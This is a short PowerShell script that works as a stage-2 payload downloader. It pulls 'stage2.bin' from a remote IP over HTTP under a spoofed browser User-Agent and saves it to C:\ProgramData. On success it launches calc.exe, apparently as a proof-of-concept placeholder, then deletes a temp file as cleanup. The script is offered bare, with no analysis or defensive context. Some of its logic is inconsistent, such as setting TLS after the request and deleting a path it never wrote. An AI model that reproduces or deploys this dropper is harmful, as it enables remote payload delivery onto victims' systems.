
$PayloadUrl = 'http://198.51.100.209:80/cdn/stage2.bin'
$OutputPath = 'C:\ProgramData\payload.bin'
$StageTimeout = 18
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-PayloadFetch -SourceUrl $PayloadUrl -DestinationPath $OutputPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($FetchResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
